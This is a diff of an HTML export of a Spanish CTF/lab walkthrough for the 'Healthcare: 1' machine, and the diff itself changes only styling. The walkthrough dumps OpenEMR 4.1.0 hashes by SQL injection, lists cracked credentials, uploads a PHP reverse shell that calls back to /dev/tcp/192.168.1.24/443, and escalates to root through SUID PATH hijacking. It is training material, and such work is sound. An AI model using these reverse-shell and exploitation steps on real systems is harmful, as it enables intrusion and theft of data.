@@ -667,15 +667,28 @@ blockquote {
 	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
 }
 	
-</style></head><body style="background-color: #E5E8E8"><article id="1bdc8b53-4d37-475b-82b4-2da82a73c74a" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_green.svg"/></div><h1 class="page-title">Healthcare: 1</h1></header><div class="page-body"><h3 id="39a5db16-711e-4c27-94f2-c812e68aa598" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="78ac0ee0-227a-4251-89f6-aaac018b2fd4" class="">
-</p><p id="5ab0ba1c-8e7b-402d-b9c7-6359fda5f09e" class="">Escaneo con Nmap para descubrir puertos abiertos en la máquina.</p><pre id="ac2a09cc-85df-4433-a613-86f3e291e9e3" class="code"><code>nmap 192.168.1.33
+</style></head><link href="css/prism.css" rel="stylesheet"/>
+<body style="background-color: #E5E8E8"><style>
+    body {
+      background-image: url('assets/gris.jpg');
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-attachment: fixed;
+    }
+  </style>
+     <style>
+    body {
+      color: azure;
+    }
+  </style><article id="1bdc8b53-4d37-475b-82b4-2da82a73c74a" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_green.svg"/></div><h1 class="page-title">Healthcare: 1</h1></header><div class="page-body"><h3 id="39a5db16-711e-4c27-94f2-c812e68aa598" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="78ac0ee0-227a-4251-89f6-aaac018b2fd4" class="">
+</p><p id="5ab0ba1c-8e7b-402d-b9c7-6359fda5f09e" class="">Escaneo con Nmap para descubrir puertos abiertos en la máquina.</p><pre id="ac2a09cc-85df-4433-a613-86f3e291e9e3" class="code"><code class="language-javascript">nmap 192.168.1.33
 Nmap scan report for 192.168.1.33
 Host is up (0.00012s latency).
 PORT   STATE SERVICE
 21/tcp open  ftp
 80/tcp open  http</code></pre><ul id="78a16a8f-0aeb-4f9c-b655-6c0cea070beb" class="bulleted-list"><li style="list-style-type:disc">21/tcp open ftp ProFTPD 1.3.3d</li></ul><ul id="73491217-e93b-4628-9819-d9228ae0a7ef" class="bulleted-list"><li style="list-style-type:disc">80/tcp open http Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))</li></ul><p id="fb9f4200-799b-4ce1-a004-2817cd1efe30" class="">
 </p><p id="d5dbd26c-7e2c-45a8-9c21-1d9e77b051fa" class="">El puerto 21 parece no permitir el ingreso como Anonymous, por lo que mientras tanto sin usuario y contraseña lo dejo a un lado.</p><p id="7a3677b7-4f64-49c0-8dfb-65639652630f" class="">
-</p><p id="462d1ba2-d3d3-4d41-b567-059a38642785" class="">Lanzo Gobuster para ver directorios y archivos en la página web.</p><pre id="15f6c36b-09ab-4905-bd3f-97162a1bc832" class="code"><code>gobuster dir -u http://192.168.1.33/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</p><p id="462d1ba2-d3d3-4d41-b567-059a38642785" class="">Lanzo Gobuster para ver directorios y archivos en la página web.</p><pre id="15f6c36b-09ab-4905-bd3f-97162a1bc832" class="code"><code class="language-javascript">gobuster dir -u http://192.168.1.33/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ===============================================================
 Gobuster v3.1.0
 ===============================================================
@@ -704,7 +717,7 @@ Starting gobuster in directory enumeration mode
 ===============================================================
 Finished
 ===============================================================</code></pre><p id="6c79a261-b8b1-4769-a2bc-1b9f337aab0c" class="">
-</p><p id="69669541-332a-48db-aa63-d6a225131f81" class="">En ninguno de estos directorios podía hacer algo, así que cambie el diccionario para ver si descubría algo más.</p><pre id="bf743fcd-f8bb-44fb-870f-38d15f2ec3c1" class="code"><code>gobuster dir -u http://192.168.1.33/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+</p><p id="69669541-332a-48db-aa63-d6a225131f81" class="">En ninguno de estos directorios podía hacer algo, así que cambie el diccionario para ver si descubría algo más.</p><pre id="bf743fcd-f8bb-44fb-870f-38d15f2ec3c1" class="code"><code class="language-javascript">gobuster dir -u http://192.168.1.33/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 ===============================================================
 Gobuster v3.1.0
 ===============================================================
@@ -736,14 +749,14 @@ Starting gobuster in directory enumeration mode
 Finished
 ===============================================================</code></pre><p id="0741497f-62d5-424c-a7bb-3031a07ceb17" class="">
 </p><p id="e3a4da7c-d849-4778-8193-bd5f36635c52" class="">Ahora si, me aparece un panel de log in de OpenEMR.</p><figure id="e1f30f91-d6a4-4c7d-96d5-f6112ee7902c" class="image" style="text-align:center"><a href="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled.png"><img style="width:960px" src="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled.png"/></a><figcaption>OpenEMR es un software gratuito de código abierto para la industria del cuidado de la salud.</figcaption></figure><p id="6a627d10-b99c-4b6a-90cb-27902ce6cb40" class="">
-</p><p id="146d9eed-50ad-49d1-8f20-ded3b5300233" class="">Si buscamos con searchsploit vulnerabilidades de la versión 4.1.0 aparecen 2 SQLi.</p><pre id="1f3f0cad-0b57-4d46-a18d-639757e93985" class="code"><code>searchsploit Openemr 4.1.0
+</p><p id="146d9eed-50ad-49d1-8f20-ded3b5300233" class="">Si buscamos con searchsploit vulnerabilidades de la versión 4.1.0 aparecen 2 SQLi.</p><pre id="1f3f0cad-0b57-4d46-a18d-639757e93985" class="code"><code class="language-javascript">searchsploit Openemr 4.1.0
 ------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                 |  Path
 ------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 OpenEMR 4.1.0 - &#x27;u&#x27; SQL Injection                                                                                              | php/webapps/49742.py
 Openemr-4.1.0 - SQL Injection                                                                                                  | php/webapps/17998.txt
 ------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</code></pre><p id="894c5f7e-4bb7-4424-a37b-ded44ea57f14" class="">
-</p><p id="ebca5e0b-61f0-45c5-be17-d3af31972cef" class="">El exploit en python es un script que dumpea los usuarios y el hash de las contraseñas.</p><pre id="e68df2e1-1056-4009-88d5-fa950d1b98c4" class="code"><code>python3 49742.py
+</p><p id="ebca5e0b-61f0-45c5-be17-d3af31972cef" class="">El exploit en python es un script que dumpea los usuarios y el hash de las contraseñas.</p><pre id="e68df2e1-1056-4009-88d5-fa950d1b98c4" class="code"><code class="language-javascript">python3 49742.py
 
    ____                   ________  _______     __ __   ___ ____
   / __ \____  ___  ____  / ____/  |/  / __ \   / // /  &lt;  // __ \
@@ -763,8 +776,8 @@ Openemr-4.1.0 - SQL Injection                                                   
 admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
 medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d</code></pre><p id="f774e586-7840-47ec-90d3-adb73c907b49" class="">
 </p><p id="8fd6fbdc-1b24-4b5d-8662-61de76d423e4" class="">Las pasamos por crackstation y nos da las contraseñas en texto claro.</p><figure id="430d07b7-38d8-450c-abdf-94a0ef499ae7" class="image" style="text-align:center"><a href="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled%201.png"><img style="width:864px" src="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled%201.png"/></a></figure><table id="9df8c98a-f313-4dff-9a1a-b19a8660bbba" class="simple-table"><tbody><tr id="3bdbc3ab-4a62-4e8f-bd1a-d613cb16d719"><td id="sbCE" class=""><strong><span style="border-bottom:0.05em solid">Username</span></strong></td><td id="=z}r" class=""><strong><span style="border-bottom:0.05em solid">Password</span></strong></td></tr><tr id="cf690e5b-2c37-4062-a8a0-c3944bbdc69d"><td id="sbCE" class="">admin</td><td id="=z}r" class="">ackbar</td></tr><tr id="06257e7a-f2ec-4edb-bf32-9ddb50be9d95"><td id="sbCE" class="">medical</td><td id="=z}r" class="">medical</td></tr></tbody></table><p id="44f047ec-9a58-4904-aa56-b346e6a5e4f6" class="">Las 2 cuentas sirven para acceder a OpenEMR, pero ingreso como admin.</p><p id="886c6ee0-305e-450f-b9f7-ea7c221b6aa2" class="">Y en el servicio FTP solamente sirve medical:medical. Si nos dirigimos a /var/www/html/openemr que es donde esta la página web montada, podemos tratar de subir un archivo php malicioso y entablar una reverse shell.</p><p id="04bc8dc0-2c20-4be1-b372-ba54e17b49a3" class="">
-</p><pre id="886956ed-a5dc-4e12-b352-8b806ee5bf39" class="code"><code>&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.24/443 0&gt;&amp;1&#x27;&quot;);?&gt;</code></pre><p id="157a6c40-083f-4295-a396-d20b1226c13a" class="">
-</p><pre id="84a40130-501d-4915-8f25-4a702ac39eb4" class="code"><code>ftp&gt; pwd
+</p><pre id="886956ed-a5dc-4e12-b352-8b806ee5bf39" class="code"><code class="language-javascript">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.24/443 0&gt;&amp;1&#x27;&quot;);?&gt;</code></pre><p id="157a6c40-083f-4295-a396-d20b1226c13a" class="">
+</p><pre id="84a40130-501d-4915-8f25-4a702ac39eb4" class="code"><code class="language-javascript">ftp&gt; pwd
 257 &quot;/var/www/html/openemr&quot; is the current directory
 ftp&gt; put shell.php 
 local: shell.php remote: shell.php
@@ -772,7 +785,7 @@ local: shell.php remote: shell.php
 150 Opening BINARY mode data connection for shell.php
 226 Transfer complete
 74 bytes sent in 0.00 secs (830.6393 kB/s)</code></pre><p id="d227a4a1-e453-4a42-b44a-01bbecb8ba05" class="">
-</p><p id="698e50f9-d916-4b03-9ea8-9374af1839ef" class="">Ahora nos ponemos en escucha por el puerto 443 y cargamos el archivo en la web.</p><figure id="b5253af4-6656-40bb-81c0-e83921116f55" class="image" style="text-align:center"><a href="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled%202.png"><img style="width:480px" src="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled%202.png"/></a></figure><pre id="e3630121-d38c-493a-a4b3-ed007ff7ee2f" class="code"><code>nc -lvp 443
+</p><p id="698e50f9-d916-4b03-9ea8-9374af1839ef" class="">Ahora nos ponemos en escucha por el puerto 443 y cargamos el archivo en la web.</p><figure id="b5253af4-6656-40bb-81c0-e83921116f55" class="image" style="text-align:center"><a href="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled%202.png"><img style="width:480px" src="Healthcare%201%201bdc8b534d37475b82b42da82a73c74a/Untitled%202.png"/></a></figure><pre id="e3630121-d38c-493a-a4b3-ed007ff7ee2f" class="code"><code class="language-javascript">nc -lvp 443
 listening on [any] 443 ...
 192.168.1.33: inverse host lookup failed: Unknown host
 connect to [192.168.1.24] from (UNKNOWN) [192.168.1.33] 43593
@@ -781,7 +794,7 @@ bash-4.1$ whoami
 whoami
 apache
 bash-4.1$</code></pre><p id="19f4ce5e-2a88-42e1-ae50-34136088a700" class="">
-</p><p id="660a375e-5a91-4e6f-b225-fd7284b07741" class="">La contraseña de medical se puede usar para convertirse en ese usuario.</p><pre id="5da869ef-50a5-4558-b080-b8538cd77533" class="code"><code>bash-4.1$ whoami
+</p><p id="660a375e-5a91-4e6f-b225-fd7284b07741" class="">La contraseña de medical se puede usar para convertirse en ese usuario.</p><pre id="5da869ef-50a5-4558-b080-b8538cd77533" class="code"><code class="language-javascript">bash-4.1$ whoami
 apache
 bash-4.1$ su medical
 Password: 
@@ -789,7 +802,7 @@ Password:
 medical
 [medical@localhost home]$</code></pre><p id="fe8e001e-25b0-4034-9fc8-f62c06f6fee0" class="">
 </p><hr id="8daddcbd-26e9-4a58-b599-2362ce2dce35"/><h3 id="71417295-5bf5-4ca0-bf2a-2a1c231a69ac" class=""><mark class="highlight-blue">Elevando Privilegios</mark></h3><p id="3e077314-de87-4452-b69f-c646180e8359" class="">
-</p><p id="064c2f8f-7151-4cc7-bca1-0d2020012781" class="">Si buscamos por permisos SUID vemos uno que llama la atención por el nombre parecido a la máquina.</p><pre id="a606b915-988d-4241-ba61-8da6322b29da" class="code"><code>[medical@localhost home]$ find / -perm -4000 2&gt;/dev/null
+</p><p id="064c2f8f-7151-4cc7-bca1-0d2020012781" class="">Si buscamos por permisos SUID vemos uno que llama la atención por el nombre parecido a la máquina.</p><pre id="a606b915-988d-4241-ba61-8da6322b29da" class="code"><code class="language-javascript">[medical@localhost home]$ find / -perm -4000 2&gt;/dev/null
 /usr/libexec/pt_chown
 /usr/lib/ssh/ssh-keysign
 /usr/lib/polkit-resolve-exe-helper
@@ -828,7 +841,7 @@ medical
 /bin/su
 /bin/mount
 /bin/umount</code></pre><p id="d5dac094-4f47-47d9-99b7-ce58c1b3df66" class="">
-</p><p id="fb5ec923-4640-4f11-a53c-622167695ea7" class="">Es un archivo ejecutable de 32 bits, si lo ejecutamos hace como un escaneo del sistema y hace un informe sobre el tamaño de un disco del sistema operativo.</p><p id="a94de891-ae55-42ec-93f3-1b91b642da6a" class="">Haciéndole un strings se ve que ejecuta varios comandos.</p><pre id="3295e90c-9621-44bb-85a4-8e151d9fdce5" class="code"><code>[medical@localhost home]$ strings /usr/bin/healthcheck
+</p><p id="fb5ec923-4640-4f11-a53c-622167695ea7" class="">Es un archivo ejecutable de 32 bits, si lo ejecutamos hace como un escaneo del sistema y hace un informe sobre el tamaño de un disco del sistema operativo.</p><p id="a94de891-ae55-42ec-93f3-1b91b642da6a" class="">Haciéndole un strings se ve que ejecuta varios comandos.</p><pre id="3295e90c-9621-44bb-85a4-8e151d9fdce5" class="code"><code class="language-javascript">[medical@localhost home]$ strings /usr/bin/healthcheck
 /lib/ld-linux.so.2
 __gmon_start__
 libc.so.6
@@ -840,14 +853,15 @@ __libc_start_main
 GLIBC_2.0
 PTRhp
 [^_]
-clear ; echo &#x27;System Health Check&#x27; ; echo &#x27;&#x27; ; echo &#x27;Scanning System&#x27; ; sleep 2 ; ifconfig ; fdisk -l ; du -h</code></pre><p id="cd480f5a-9fe4-4cb6-8895-20681eef7e55" class=""> Sabiendo esto podemos tratar de hacer un path hijacking, ya que no ejecuta el comando con la ruta absoluta.</p><pre id="a9c54d3f-eaff-40b9-afc6-3da2b13c7e9a" class="code"><code>[medical@localhost tmp]$ echo &quot;/bin/bash&quot; &gt; ifconfig
+clear ; echo &#x27;System Health Check&#x27; ; echo &#x27;&#x27; ; echo &#x27;Scanning System&#x27; ; sleep 2 ; ifconfig ; fdisk -l ; du -h</code></pre><p id="cd480f5a-9fe4-4cb6-8895-20681eef7e55" class=""> Sabiendo esto podemos tratar de hacer un path hijacking, ya que no ejecuta el comando con la ruta absoluta.</p><pre id="a9c54d3f-eaff-40b9-afc6-3da2b13c7e9a" class="code"><code class="language-javascript">[medical@localhost tmp]$ echo &quot;/bin/bash&quot; &gt; ifconfig
 [medical@localhost tmp]$ chmod +x ifconfig 
 [medical@localhost tmp]$ echo $PATH
 /sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
 [medical@localhost tmp]$ export PATH=/tmp:$PATH
 [medical@localhost tmp]$ echo $PATH
-/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin</code></pre><p id="15469739-478c-4ae7-8b15-0b25b503119b" class="">Ahora ejecutamos el binario y ganaríamos una shell como root.</p><pre id="98360884-affa-4759-87c0-f262cca96b16" class="code"><code>System Health Check
+/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin</code></pre><p id="15469739-478c-4ae7-8b15-0b25b503119b" class="">Ahora ejecutamos el binario y ganaríamos una shell como root.</p><pre id="98360884-affa-4759-87c0-f262cca96b16" class="code"><code class="language-javascript">System Health Check
 
 Scanning System
 [root@localhost tmp]# whoami
-root</code></pre></div></article></body></html>
+root</code></pre></div></article></body><script src="css/prism.css"></script>
+</html>
